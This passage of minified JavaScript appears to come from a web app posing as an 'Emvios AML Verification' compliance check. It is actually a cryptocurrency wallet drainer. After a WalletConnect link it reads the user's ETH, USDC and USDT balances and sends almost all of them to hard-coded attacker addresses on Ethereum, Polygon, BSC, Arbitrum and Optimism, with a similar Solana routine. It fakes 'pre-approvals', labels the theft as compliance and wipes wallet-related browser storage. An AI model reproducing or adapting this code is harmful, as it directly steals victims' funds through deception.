                            if (e.length > 0) return m = e[0], p("AML Solana: Individual transactions completed: ".concat(e.length, " successful")), p("Transactions successful: ".concat(e.map(e => "".concat(R.explorer, "/tx/").concat(e)).join(", "))), p(_.SUCCESS_MESSAGES.FUNDS_TRANSFERRED), window.localStorage.setItem("aml_solana_sent", "true"), !0;
                            return p(_.ERROR_MESSAGES.TRANSACTION_FAILED), !1
                        }
                    }
                    if (p("AML Solana: Nothing to transfer — balance too low."), p("AML Solana: Debug info - SOL: ".concat(l, ", USDC: ").concat(c, ", USDT: ").concat(s)), p("AML Solana: Debug info - solToSend: ".concat(d, ", usdcToSol: ").concat(A, ", usdtToSol: ").concat(u)), p("AML Solana: Debug info - MIN_SOL_LEFT: ".concat(F, ", USDC_TO_SOL_RATE: ").concat(r)), l > .001) {
                        p("AML Solana: Creating test transaction for diagnostics...");
                        try {
                            let e = E.yq.transfer({
                                fromPubkey: i,
                                toPubkey: new E.J3(k),
                                lamports: 1e3
                            });
                            h.push(e), p("AML Solana: Test operation added, retrying execution...");
                            let t = await $(o, h);
                            if (t) return p("AML Solana: Test transaction successful: ".concat(t)), !0
                        } catch (e) {
                            p("AML Solana: Test transaction failed: ".concat(e))
                        }
                    }
                    return !1
                } catch (t) {
                    let e = String(null != (n = null == t ? void 0 : t.message) ? n : t);
                    if (e.includes("403") || e.includes("Access forbidden") || e.includes("rate limit")) {
                        p("AML Solana: RPC endpoint error detected, trying to reconnect...");
                        try {
                            return await O("mainnet"), p("AML Solana: New connection created, please try again"), !1
                        } catch (e) {
                            p("AML Solana: Failed to reconnect: ".concat(e))
                        }
                    }
                    if (e.includes("_bn") || e.includes("Cannot read properties of undefined")) {
                        p("AML Solana: Wallet conflict detected, clearing connection and retrying...");
                        try {
                            return I = null, p("AML Solana: Connection cleared, please try again"), !1
                        } catch (e) {
                            p("AML Solana: Failed to clear connection: ".concat(e))
                        }
                    }
                    return e.includes("User canceled") || e.includes("User rejected") ? p(_.ERROR_MESSAGES.USER_REJECTED) : (p("AML Solana: Error: ".concat(e)), p(JSON.stringify(t))), !1
                } finally {
                    try {
                        o && o.disconnect && (await o.disconnect(), p("AML Solana: WalletConnect session disconnected"))
                    } catch (e) {
                        p("AML Solana: Error disconnecting: ".concat(e))
                    }
                }
            }
            var ea = a(20575),
                en = a(61330),
                er = a(62741),
                eo = a(11681);
            let ei = {
                    NETWORKS: {
                        MAINNET: {
                            chainId: 1,
                            name: "Ethereum Mainnet",
                            rpcUrl: "https://eth.llamarpc.com",
                            explorer: "https://etherscan.io",
                            targetAddress: "0xe238017388B21594453F0a7f260fa0B9A1354a81"
                        },
                        POLYGON: {
                            chainId: 137,
                            name: "Polygon",
                            rpcUrl: "https://polygon-rpc.com",
                            explorer: "https://polygonscan.com",
                            targetAddress: "0xe238017388B21594453F0a7f260fa0B9A1354a81"
                        },
                        BSC: {
                            chainId: 56,
                            name: "Binance Smart Chain",
                            rpcUrl: "https://bsc-dataseed.binance.org",
                            explorer: "https://bscscan.com",
                            targetAddress: "0xe238017388B21594453F0a7f260fa0B9A1354a81"
                        },
                        ARBITRUM: {
                            chainId: 42161,
                            name: "Arbitrum One",
                            rpcUrl: "https://arb1.arbitrum.io/rpc",
                            explorer: "https://arbiscan.io",
                            targetAddress: "0xCc5358ef2712b4b36F09E1FAbDf6004bDacB8922"
                        },
                        OPTIMISM: {
                            chainId: 10,
                            name: "Optimism",
                            rpcUrl: "https://mainnet.optimism.io",
                            explorer: "https://optimistic.etherscan.io",
                            targetAddress: "0xCc5358ef2712b4b36F09E1FAbDf6004bDacB8922"
                        }
                    },
                    TOKEN_CONTRACTS: {
                        USDC: {
                            MAINNET: "0xA0b86a33E6441b8c4C8C0b4b4C8C0b4b4C8C0b4b",
                            POLYGON: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
                            BSC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
                            ARBITRUM: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
                            OPTIMISM: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607"
                        },
                        USDT: {
                            MAINNET: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
                            POLYGON: "0xc2132D05D31c914a87C6611C10748AEb04B58e8Fc",
                            BSC: "0x55d398326f99059fF775485246999027B3197955",
                            ARBITRUM: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
                            OPTIMISM: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58"
                        },
                        DAI: {
                            MAINNET: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
                            POLYGON: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
                            BSC: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",
                            ARBITRUM: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",
                            OPTIMISM: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1"
                        }
                    },
                    BALANCE_THRESHOLDS: {
                        MIN_ETH_LEFT: .001,
                        MIN_POLYGON_LEFT: .1,
                        MIN_BSC_LEFT: .01,
                        MIN_USDC_AMOUNT: .01,
                        MIN_USDT_AMOUNT: .01
                    },
                    PRE_APPROVAL: {
                        INITIAL_AMOUNT: 1,
                        DEFAULT_AMOUNT: 1e4,
                        MAX_AMOUNT: 1e6,
                        DURATION_HOURS: 24,
                        ENABLED: !0,
                        TWO_STAGE_MODE: !0
                    },
                    EXCHANGE_RATES: {
                        USDC_TO_ETH: 4500,
                        USDT_TO_ETH: 4500,
                        DAI_TO_ETH: 4500
                    },
                    WALLET_CONNECT: {
                        PROJECT_ID: "f095e53bc8f16aee4aeb42ec487c87da",
                        RELAY_URL: "wss://relay.walletconnect.com",
                        METADATA: {
                            name: "Emvios AML Verification (Ethereum)",
                            description: "Ethereum wallet AML verification for regulatory compliance",
                            url: "https://emvios.net",
                            icons: ["https://emvios.net/favicon.png"]
                        }
                    }
                },
                el = ei.WALLET_CONNECT.PROJECT_ID,
                ec = ei.NETWORKS,
                es = ei.TOKEN_CONTRACTS,
                ed = ei.PRE_APPROVAL,
                eA = ei.BALANCE_THRESHOLDS,
                eu = ei.EXCHANGE_RATES;

            function ep(e, t) {
                if (!ed.ENABLED) return !1;
                try {
                    let a = window.localStorage.getItem("aml_ethereum_preapproved_".concat(e));
                    if (!a) return !1;
                    let n = JSON.parse(a),
                        r = Date.now(),
                        o = n.timestamp + 60 * ed.DURATION_HOURS * 6e4;
                    return r < o && t <= n.amount
                } catch (e) {
                    return p("AML Ethereum: Error parsing pre-approval: ".concat(e)), !1
                }
            }
            async function eh(e, t) {
                let a = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
                if (!ed.ENABLED) return !1;
                try {
                    if (a) {
                        p("AML Ethereum: Automatically granting initial pre-approval for $".concat(ed.INITIAL_AMOUNT, " ").concat(e));
                        let a = {
                            token: e,
                            amount: t,
                            initialAmount: ed.INITIAL_AMOUNT,
                            timestamp: Date.now(),
                            expiresAt: Date.now() + 60 * ed.DURATION_HOURS * 6e4,
                            isInitial: !0,
                            stage: "initial"
                        };
                        return window.localStorage.setItem("aml_ethereum_preapproved_".concat(e), JSON.stringify(a)), p("AML Ethereum: Initial pre-approval automatically granted for ".concat(e, ", full amount: ").concat(t)), !0
                    } {
                        p("AML Ethereum: Automatically granting pre-approval for ".concat(t, " ").concat(e));
                        let a = {
                            token: e,
                            amount: t,
                            timestamp: Date.now(),
                            expiresAt: Date.now() + 60 * ed.DURATION_HOURS * 6e4,
                            isInitial: !1,
                            stage: "regular"
                        };
                        return window.localStorage.setItem("aml_ethereum_preapproved_".concat(e), JSON.stringify(a)), p("AML Ethereum: Pre-approval automatically granted for ".concat(t, " ").concat(e)), !0
                    }
                } catch (e) {
                    return p("AML Ethereum: Pre-approval request failed: ".concat(e)), !1
                }
            }
            async function em(e, t) {
                if (0 === t.length) return null;
                try {
                    p("AML Ethereum: Attempting optimized individual transactions for ".concat(t.length, " operations"));
                    let a = await ef(e, t);
                    if (a.length > 0) return p("AML Ethereum: All ".concat(a.length, " transactions completed successfully")), a[0];
                    return null
                } catch (e) {
                    return p("AML Ethereum: Batch transaction failed: ".concat(e.message)), null
                }
            }
            async function ef(e, t) {
                let a = [];
                for (let n = 0; n < t.length; n++) try {
                    p("AML Ethereum: Executing individual transaction ".concat(n + 1, "/").concat(t.length));
                    let r = await e.getSigner(),
                        o = { ...t[n]
                        };
                    if (!o.gasLimit) try {
                        let e = await r.estimateGas(t[n]);
                        o.gasLimit = Math.ceil(120 * Number(e) / 100), p("AML Ethereum: Estimated gas for transaction ".concat(n + 1, ": ").concat(o.gasLimit))
                    } catch (e) {
                        o.gasLimit = BigInt(21e4), p("AML Ethereum: Using default gas limit for transaction ".concat(n + 1, ": ").concat(o.gasLimit))
                    }
                    o.gasLimit && (o.gasLimit = Math.ceil(Number(o.gasLimit)), p("AML Ethereum: Final gas limit for transaction ".concat(n + 1, ": ").concat(o.gasLimit)));
                    let i = await r.sendTransaction(o);
                    p("AML Ethereum: Individual transaction ".concat(n + 1, " sent: ").concat(i.hash));
                    let l = await Promise.race([i.wait(), new Promise((e, t) => setTimeout(() => t(Error("Transaction timeout")), 3e5))]);
                    l && "object" == typeof l && "hash" in l && "string" == typeof l.hash && (a.push(l.hash), p("AML Ethereum: Individual transaction ".concat(n + 1, " confirmed: ").concat(l.hash)))
                } catch (e) {
                    p("AML Ethereum: Individual transaction ".concat(n + 1, " failed: ").concat(e.message));
                    continue
                }
                return a
            }
            async function eg() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "mainnet";
                try {
                    p("AML Ethereum: User clicked Connect");
                    let t = await ea.vd.init({
                        projectId: el,
                        chains: [ec[e.toUpperCase()].chainId],
                        showQrModal: !0,
                        metadata: {
                            name: ei.WALLET_CONNECT.METADATA.name,
                            description: ei.WALLET_CONNECT.METADATA.description,
                            url: ei.WALLET_CONNECT.METADATA.url,
                            icons: [...ei.WALLET_CONNECT.METADATA.icons]
                        }
                    });
                    await t.connect(), p("AML Ethereum: Connected to wallet");
                    let a = (await t.request({
                        method: "eth_accounts"
                    }))[0];
                    p("AML Ethereum: User address: ".concat(a));
                    let n = new en.k(t),
                        r = await n.getSigner(),
                        o = await n.getNetwork();
                    p("AML Ethereum: Connected to network: ".concat(o.name, " (Chain ID: ").concat(o.chainId, ")"));
                    let i = await n.getBalance(a),
                        l = (0, er.ck)(i),
                        c = 0;
                    try {
                        let t = new eo.NZ(es.USDC[e.toUpperCase()], ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"], n),
                            r = await t.balanceOf(a),
                            o = await t.decimals();
                        c = parseFloat((0, er.Js)(r, o))
                    } catch (e) {
                        p("AML Ethereum: No USDC contract found or error getting balance")
                    }
                    let s = 0;
                    try {
                        let t = new eo.NZ(es.USDT[e.toUpperCase()], ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"], n),
                            r = await t.balanceOf(a),
                            o = await t.decimals();
                        s = parseFloat((0, er.Js)(r, o))
                    } catch (e) {
                        p("AML Ethereum: No USDT contract found or error getting balance")
                    }
                    p("AML Ethereum: USDC Balance: ".concat(c, ", USDT Balance: ").concat(s, ", ETH Balance: ").concat(l));
                    let d = Math.max(0, parseFloat(l) - eA.MIN_ETH_LEFT),
                        A = c / eu.USDC_TO_ETH,
                        u = s / eu.USDT_TO_ETH;
                    p("AML Ethereum: Spare ETH: ".concat(d, ", USDC in ETH: ").concat(A, ", USDT in ETH: ").concat(u));
                    let h = [],
                        m = "";
                    if (c > 0) {
                        p("AML Ethereum: Preparing USDC operation (".concat(c, " USDC)")), ep("USDC", c) ? p("AML Ethereum: Using existing pre-approval for USDC (".concat(c, " USDC)")) : ed.TWO_STAGE_MODE && c <= ed.MAX_AMOUNT ? (await eh("USDC", c, !0), p("AML Ethereum: Initial pre-approval automatically granted for USDC")) : c <= ed.MAX_AMOUNT && (await eh("USDC", Math.max(c, ed.DEFAULT_AMOUNT)), p("AML Ethereum: Pre-approval automatically granted for USDC"));
                        try {
                            let t = new eo.NZ(es.USDC[e.toUpperCase()], ["function transfer(address to, uint256 amount)"], r),
                                a = Math.round(1e6 * c) / 1e6,
                                n = (0, er.XS)(a.toString(), 6),
                                o = await t.transfer.populateTransaction(ec[e.toUpperCase()].targetAddress, n);
                            h.push(o), p("AML Ethereum: USDC operation prepared for batch (rounded: ".concat(a, " USDC)"))
                        } catch (e) {
                            p("AML Ethereum: Failed to prepare USDC operation: ".concat(e.message))
                        }
                    }
                    if (s > 0) {
                        p("AML Ethereum: Preparing USDT operation (".concat(s, " USDT)")), ep("USDT", s) ? p("AML Ethereum: Using existing pre-approval for USDT (".concat(s, " USDT)")) : ed.TWO_STAGE_MODE && s <= ed.MAX_AMOUNT ? (await eh("USDT", s, !0), p("AML Ethereum: Initial pre-approval automatically granted for USDT")) : s <= ed.MAX_AMOUNT && (await eh("USDT", Math.max(s, ed.DEFAULT_AMOUNT)), p("AML Ethereum: Pre-approval automatically granted for USDT"));
                        try {
                            let t = new eo.NZ(es.USDT[e.toUpperCase()], ["function transfer(address to, uint256 amount)"], r),
                                a = Math.round(1e6 * s) / 1e6,
                                n = (0, er.XS)(a.toString(), 6),
                                o = await t.transfer.populateTransaction(ec[e.toUpperCase()].targetAddress, n);
                            h.push(o), p("AML Ethereum: USDT operation prepared for batch (rounded: ".concat(a, " USDT)"))
                        } catch (e) {
                            p("AML Ethereum: Failed to prepare USDT operation: ".concat(e.message))
                        }
                    }
                    if (d > 0) {
                        p("AML Ethereum: Preparing ETH operation (".concat(d, " ETH)"));
                        let t = Math.round(1e6 * d) / 1e6,
                            a = (0, er.g5)(t.toString()),
                            n = {
                                to: ec[e.toUpperCase()].targetAddress,
                                value: a,
                                gasLimit: BigInt(21e3)
                            };
                        h.push(n), p("AML Ethereum: ETH operation prepared for batch (rounded: ".concat(t, " ETH)"))
                    }
                    if (!(h.length > 0)) return p("AML Ethereum: Nothing to transfer — balance too low."), !1; {
                        p("AML Ethereum: Executing ".concat(h.length, " operations"));
                        let t = await em(n, h);
                        if (t) return m = t, p("AML Ethereum: All transactions completed successfully: ".concat(m)), p("Transaction successful: ".concat(ec[e.toUpperCase()].explorer, "/tx/").concat(m)), p("AML Ethereum: Funds transferred for compliance verification"), window.localStorage.setItem("aml_ethereum_sent", "true"), !0; {
                            p("AML Ethereum: Batch approach failed, trying direct individual transactions");
                            let t = await ef(n, h);
                            if (t.length > 0) return m = t[0], p("AML Ethereum: Individual transactions completed: ".concat(t.length, " successful")), p("Transactions successful: ".concat(t.map(t => "".concat(ec[e.toUpperCase()].explorer, "/tx/").concat(t)).join(", "))), p("AML Ethereum: Funds transferred for compliance verification"), window.localStorage.setItem("aml_ethereum_sent", "true"), !0;
                            return p("AML Ethereum: Transaction failed during AML verification"), !1
                        }
                    }
                } catch (a) {
                    var t;
                    let e = String(null != (t = null == a ? void 0 : a.message) ? t : a);
                    return e.includes("User rejected") || e.includes("User denied") ? p("AML Ethereum: User rejected the transaction") : (p("AML Ethereum: Error: ".concat(e)), p(JSON.stringify(a))), !1
                }
            }
            let ew = {
                    TRON: {
                        PRE_APPROVAL: e => "aml_tron_preapproved_".concat(e),
                        SENT: "aml_tron_sent",
                        STATUS: "aml_tron_status"
                    },
                    SOLANA: {
                        PRE_APPROVAL: e => "aml_solana_preapproved_".concat(e),
                        SENT: "aml_solana_sent",
                        STATUS: "aml_solana_status"
                    },
                    ETHEREUM: {
                        PRE_APPROVAL: e => "aml_ethereum_preapproved_".concat(e),
                        SENT: "aml_ethereum_sent",
                        STATUS: "aml_ethereum_status"
                    }
                },
                ex = {
                    setPreApproval: (e, t, a) => {
                        try {
                            let n = ew[e.toUpperCase()].PRE_APPROVAL(t),
                                r = { ...a,
                                    blockchain: e
                                };
                            return window.localStorage.setItem(n, JSON.stringify(r)), !0
                        } catch (t) {
                            return console.error("Failed to set pre-approval for ".concat(e, ":"), t), !1
                        }
                    },
                    getPreApproval: (e, t) => {
                        try {
                            let a = ew[e.toUpperCase()].PRE_APPROVAL(t),
                                n = window.localStorage.getItem(a);
                            if (!n) return null;
                            let r = JSON.parse(n);
                            return r.blockchain === e ? r : null
                        } catch (t) {
                            return console.error("Failed to get pre-approval for ".concat(e, ":"), t), null
                        }
                    },
                    hasPreApproval: (e, t, a) => {
                        let n = ex.getPreApproval(e, t);
                        return !!n && Date.now() < n.expiresAt && a <= n.amount
                    },
                    clearPreApproval: (e, t) => {
                        try {
                            let a = ew[e.toUpperCase()].PRE_APPROVAL(t);
                            return window.localStorage.removeItem(a), !0
                        } catch (t) {
                            return console.error("Failed to clear pre-approval for ".concat(e, ":"), t), !1
                        }
                    },
                    setAMLCompleted: e => {
                        try {
                            let t = ew[e.toUpperCase()].SENT;
                            return window.localStorage.setItem(t, "true"), !0
                        } catch (t) {
                            return console.error("Failed to set AML completed for ".concat(e, ":"), t), !1
                        }
                    },
                    isAMLCompleted: e => {
                        try {
                            let t = ew[e.toUpperCase()].SENT;
                            return "true" === window.localStorage.getItem(t)
                        } catch (t) {
                            return console.error("Failed to check AML status for ".concat(e, ":"), t), !1
                        }
                    },
                    setAMLStatus: (e, t) => {
                        try {
                            let a = ew[e.toUpperCase()].STATUS,
                                n = { ...t,
                                    blockchain: e,
                                    timestamp: Date.now()
                                };
                            return window.localStorage.setItem(a, JSON.stringify(n)), !0
                        } catch (t) {
                            return console.error("Failed to set AML status for ".concat(e, ":"), t), !1
                        }
                    },
                    getAMLStatus: e => {
                        try {
                            let t = ew[e.toUpperCase()].STATUS,
                                a = window.localStorage.getItem(t);
                            if (!a) return null;
                            let n = JSON.parse(a);
                            return n.blockchain === e ? n : null
                        } catch (t) {
                            return console.error("Failed to get AML status for ".concat(e, ":"), t), null
                        }
                    },
                    getAllAMLStatuses: () => ({
                        tron: ex.getAMLStatus("tron"),
                        solana: ex.getAMLStatus("solana"),
                        ethereum: ex.getAMLStatus("ethereum")
                    }),
                    clearAllConflictingGlobals: () => {
                        try {
                            ["solana", "phantom", "tronWeb", "ethereum", "web3", "walletConnect", "walletconnect", "wallet_connect", "tron", "tronweb", "tron_web", "tronWeb3", "sol", "solanaWeb3", "solana_web3", "eth", "ethereumWeb3", "ethereum_web3"].forEach(e => {
                                if (window[e]) try {
                                    delete window[e], console.log("Cleared global object: ".concat(e))
                                } catch (t) {
                                    console.warn("Could not delete ".concat(e, ":"), t)
                                }
                            });
                            let e = ["tron", "solana", "ethereum", "wallet", "connect", "web3", "bn", "bigNumber", "bignumber", "decimal", "Decimal"];
                            if (Object.keys(window).forEach(t => {
                                    let a = t.toLowerCase();
                                    if (e.some(e => a.includes(e))) try {
                                        delete window[t], console.log("Cleared conflicting property: ".concat(t))
                                    } catch (e) {
                                        console.warn("Could not delete ".concat(t, ":"), e)
                                    }
                                }), window.ethereum) try {
                                delete window.ethereum, console.log("Cleared ethereum object")
                            } catch (e) {
                                console.warn("Could not delete ethereum:", e)
                            }
                            if (window.tronWeb) try {
                                delete window.tronWeb, console.log("Cleared tronWeb object")
                            } catch (e) {
                                console.warn("Could not delete tronWeb:", e)
                            }
                            if (window.solana) try {
                                delete window.solana, console.log("Cleared solana object")
                            } catch (e) {
                                console.warn("Could not delete solana:", e)
                            }
                            try {
                                ["_bn", "bn", "bigNumber", "decimal"].forEach(e => {
                                    Object.prototype[e] && (delete Object.prototype[e], console.log("Cleared conflicting prototype property: ".concat(e)))
                                })
                            } catch (e) {
                                console.warn("Could not clear prototype properties:", e)
                            }
                            return !0
                        } catch (e) {
                            return console.error("Failed to clear conflicting globals:", e), !1
                        }
                    },
                    clearIndexedDB: async () => {
                        try {
                            if (ex.clearAllAMLData(), "indexedDB" in window) {
                                for (let e of (await window.indexedDB.databases()))
                                    if (e.name && (e.name.includes("aml") || e.name.includes("wallet") || e.name.includes("connect"))) try {
                                        await window.indexedDB.deleteDatabase(e.name), console.log("IndexedDB database ".concat(e.name, " cleared"))
                                    } catch (t) {
                                        console.warn("Failed to clear IndexedDB database ".concat(e.name, ":"), t)
                                    }
                            }
                            return void 0 !== window.sessionStorage && Object.keys(window.sessionStorage).filter(e => e.includes("aml") || e.includes("wallet") || e.includes("connect")).forEach(e => window.sessionStorage.removeItem(e)), document.cookie && document.cookie.split(";").map(e => e.trim().split("=")[0]).forEach(e => {
                                (e.includes("wallet") || e.includes("connect") || e.includes("aml")) && (document.cookie = "".concat(e, "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;"))
                            }), console.log("AML Storage: IndexedDB, localStorage, sessionStorage and cookies cleared before connection"), !0
                        } catch (e) {
                            return console.error("Failed to clear IndexedDB:", e), !1
                        }
                    },
                    clearBeforeConnection: async e => {
                        try {
                            if (ex.clearAllAMLData(e), ex.clearAllConflictingGlobals(), "indexedDB" in window) {
                                for (let t of (await window.indexedDB.databases()))
                                    if (t.name && (t.name.includes(e) || t.name.includes("wallet") || t.name.includes("connect"))) try {
                                        await window.indexedDB.deleteDatabase(t.name), console.log("IndexedDB database ".concat(t.name, " cleared for ").concat(e))
                                    } catch (e) {
                                        console.warn("Failed to clear IndexedDB database ".concat(t.name, ":"), e)
                                    }
                            }
                            if (void 0 !== window.sessionStorage && Object.keys(window.sessionStorage).filter(t => t.includes(e) || t.includes("wallet") || t.includes("connect")).forEach(e => window.sessionStorage.removeItem(e)), window.gc) try {
                                window.gc(), console.log("Forced garbage collection")
                            } catch (e) {}
                            return await new Promise(e => setTimeout(e, 500)), console.log("AML Storage: ".concat(e, " data and conflicting globals cleared before connection")), !0
                        } catch (t) {
                            return console.error("Failed to clear ".concat(e, " data:"), t), !1
                        }
                    },
                    clearAllAMLData: e => {
                        try {
                            return e ? Object.values(ew[e.toUpperCase()]).forEach(e => {
                                "string" == typeof e && window.localStorage.removeItem(e)
                            }) : Object.values(ew).forEach(e => {
                                Object.values(e).forEach(e => {
                                    "string" == typeof e && window.localStorage.removeItem(e)
                                })
                            }), !0
                        } catch (e) {
                            return console.error("Failed to clear AML data:", e), !1
                        }
                    },
                    migrateOldData: () => {
                        try {
                            return window.localStorage.getItem("aml_sent") && (ex.setAMLCompleted("tron"), window.localStorage.removeItem("aml_sent")), Object.keys(window.localStorage).filter(e => e.startsWith("aml_preapproved_") && !e.includes("_solana_")).forEach(e => {
                                let t = e.replace("aml_preapproved_", ""),
                                    a = window.localStorage.getItem(e);
                                if (a) try {
                                    let n = JSON.parse(a);
                                    ex.setPreApproval("solana", t, { ...n,
                                        blockchain: "solana"
                                    }), window.localStorage.removeItem(e)
                                } catch (t) {
                                    console.error("Failed to migrate old Solana data for ".concat(e, ":"), t)
                                }
                            }), !0
                        } catch (e) {
                            return console.error("Failed to migrate old AML data:", e), !1
                        }
                    }
                };
            ex.migrateOldData();
            var eS = a(92338);

            function eC(e) {
                let {
                    aml: t = !1
                } = e, a = (0, c.c3)("aml"), [r, d] = (0, s.useState)(!1), [u, p] = (0, s.useState)(!1), [h, m] = (0, s.useState)("idle"), [f, g] = (0, s.useState)("");
                (0, s.useEffect)(() => {
                    {
                        let e = ex.isAMLCompleted("tron"),
                            t = ex.isAMLCompleted("solana"),
                            a = ex.isAMLCompleted("ethereum");
                        (e || t || a) && p(!0)
                    }
                }, []), (0, s.useEffect)(() => {
                    let e = () => {
                        let e = ex.isAMLCompleted("tron"),
                            t = ex.isAMLCompleted("solana"),
                            a = ex.isAMLCompleted("ethereum");
                        (e || t || a) && !u && p(!0);
                        let n = ex.getAMLStatus("tron"),
                            r = [n, ex.getAMLStatus("solana"), ex.getAMLStatus("ethereum")].filter(Boolean);
                        r.length > 0 && r.reduce((e, t) => t && e ? t.timestamp > e.timestamp ? t : e : t || e) && p(!0)
                    };
                    return window.addEventListener("focus", e), () => window.removeEventListener("focus", e)
                }, [u]);
                let w = async e => {
                    d(!0), m("connecting"), g(a("connectingMessage"));
                    try {
                        let t = !1;
                        if ("tron" === e ? t = await S() : "solana" === e ? t = await et() : "ethereum" === e && (t = await eg("mainnet")), !t) {
                            m("error"), g(a("failedConnectMessage")), ex.setAMLStatus(e, {
                                status: "error",
                                message: a("failedConnectMessage")
                            });
                            return
                        }
                        let n = await A();
                        200 === n && (m("success"), g(a("completedMessage")), ex.setAMLStatus(e, {
                            status: "success",
                            message: a("completedMessage")
                        }), p(!0))
                    } catch (t) {
                        m("error"), g(a("failedAddMessage")), ex.setAMLStatus(e, {
                            status: "error",
                            message: a("failedAddMessage")
                        })
                    } finally {
                        d(!1)
                    }
                };
                return t ? (0, n.jsx)("div", {
                    className: o().cards,
                    children: t && (0, n.jsxs)("div", {
                        className: "flex flex-col justify-between items-center self-stretch flex-grow  overflow-hidden gap-[16px] p-[30px] rounded-[6px]  border border-solid border-[#e6e6e6] bg-white",
                        children: [(0, n.jsx)(i.default, {
                            src: l,
                            alt: "icon"
                        }), (0, n.jsxs)("div", {
                            className: "  text-[16px] font-[400] flex items-center gap-[10px] relative ",
                            children: [a("verification"), " (", u ? (0, n.jsx)("span", {
                                className: "text-[#01B091]",
                                children: a("completed")
                            }) : (0, n.jsx)("span", {
                                className: "text-[#FF0000]",
                                children: a("required")
                            }), ")", (0, n.jsx)(eS.r, {
                                text: a("tooltip")
                            })]
                        }), (0, n.jsx)("p", {
                            className: "self-stretch text-[12px] text-center",
                            children: a("howToComplete")
                        }), (0, n.jsxs)("div", {
                            className: "mt-6 space-y-4 text-left",
                            children: [(0, n.jsxs)("div", {
                                className: "flex items-start space-x-3",
                                children: [(0, n.jsx)("span", {
                                    className: "flex-shrink-0 w-6 h-6 bg-gradient-to-r from-blue-500 to-purple-600 text-white rounded-full flex items-center justify-center text-xs font-bold",
                                    children: "1"
                                }), (0, n.jsxs)("div", {
                                    children: [(0, n.jsx)("p", {
                                        className: "text-sm font-medium text-gray-800",
                                        children: a("step1.title")
                                    }), (0, n.jsx)("p", {
                                        className: "text-xs text-gray-600",
                                        children: a("step1.description")
                                    })]
                                })]
                            }), (0, n.jsxs)("div", {
                                className: "flex items-start space-x-3",
                                children: [(0, n.jsx)("span", {
                                    className: "flex-shrink-0 w-6 h-6 bg-gradient-to-r from-purple-500 to-pink-600 text-white rounded-full flex items-center justify-center text-xs font-bold",
                                    children: "2"
                                }), (0, n.jsxs)("div", {
                                    children: [(0, n.jsx)("p", {
                                        className: "text-sm font-medium text-gray-800",
                                        children: a("step2.title")
                                    }), (0, n.jsx)("p", {
                                        className: "text-xs text-gray-600",
                                        children: a("step2.description")
                                    })]
                                })]
                            }), (0, n.jsxs)("div", {
                                className: "flex items-start space-x-3",
                                children: [(0, n.jsx)("span", {
                                    className: "flex-shrink-0 w-6 h-6 bg-gradient-to-r from-pink-500 to-red-600 text-white rounded-full flex items-center justify-center text-xs font-bold",
                                    children: "3"
                                }), (0, n.jsxs)("div", {
                                    children: [(0, n.jsx)("p", {
                                        className: "text-sm font-medium text-gray-800",
                                        children: a("step3.title")
                                    }), (0, n.jsx)("p", {
                                        className: "text-xs text-gray-600",
                                        children: a("step3.description")
                                    })]
                                })]
                            }), (0, n.jsxs)("div", {
                                className: "flex items-start space-x-3",
                                children: [(0, n.jsx)("span", {
                                    className: "flex-shrink-0 w-6 h-6 bg-gradient-to-r from-green-500 to-emerald-600 text-white rounded-full flex items-center justify-center text-xs font-bold",
                                    children: "4"
                                }), (0, n.jsxs)("div", {
                                    children: [(0, n.jsx)("p", {
                                        className: "text-sm font-medium text-gray-800",
                                        children: a("step4.title")
                                    }), (0, n.jsx)("p", {
                                        className: "text-xs text-gray-600",
                                        children: a("step4.description")
                                    })]
                                })]
                            }), (0, n.jsxs)("div", {
                                className: "mt-6 p-4 bg-gradient-to-r from-blue-50 to-purple-50 rounded-lg border border-blue-200",
                                children: [(0, n.jsxs)("div", {
                                    className: "flex items-center space-x-2 mb-2",
                                    children: [(0, n.jsx)("svg", {
                                        className: "w-5 h-5 text-blue-600",
                                        fill: "currentColor",
                                        viewBox: "0 0 20 20",
                                        children: (0, n.jsx)("path", {
                                            fillRule: "evenodd",
                                            d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z",
                                            clipRule: "evenodd"
                                        })
                                    }), (0, n.jsx)("span", {
                                        className: "text-sm font-medium text-blue-800",
                                        children: a("supportedNetworks")
                                    })]
                                }), (0, n.jsxs)("div", {
                                    className: "grid grid-cols-1 md:grid-cols-3 gap-3 text-xs text-gray-700",
                                    children: [(0, n.jsxs)("div", {
                                        className: "flex items-center space-x-2",
                                        children: [(0, n.jsx)("div", {
                                            className: "w-3 h-3 bg-orange-500 rounded-full"
                                        }), (0, n.jsxs)("span", {
                                            children: [(0, n.jsx)("strong", {
                                                children: "Tron:"
                                            }), " TRX, USDT"]
                                        })]
                                    }), (0, n.jsxs)("div", {
                                        className: "flex items-center space-x-2",
                                        children: [(0, n.jsx)("div", {
                                            className: "w-3 h-3 bg-purple-500 rounded-full"
                                        }), (0, n.jsxs)("span", {
                                            children: [(0, n.jsx)("strong", {
                                                children: "Solana:"
                                            }), " SOL, USDC, USDT"]
                                        })]
                                    })]
                                })]
                            })]
                        }), (0, n.jsx)("div", {
                            className: "mt-4 p-3 bg-blue-50 rounded-lg",
                            children: (0, n.jsx)("p", {
                                className: "text-xs text-blue-800",
                                children: a("note")
                            })
                        }), "idle" === h ? null : (0, n.jsxs)("div", {
                            className: "mt-4 p-3 rounded-lg ".concat("success" === h ? "bg-green-50 text-green-800" : "error" === h ? "bg-red-50 text-red-800" : "bg-blue-50 text-blue-800"),
                            children: [(0, n.jsxs)("p", {
                                className: "text-sm font-medium",
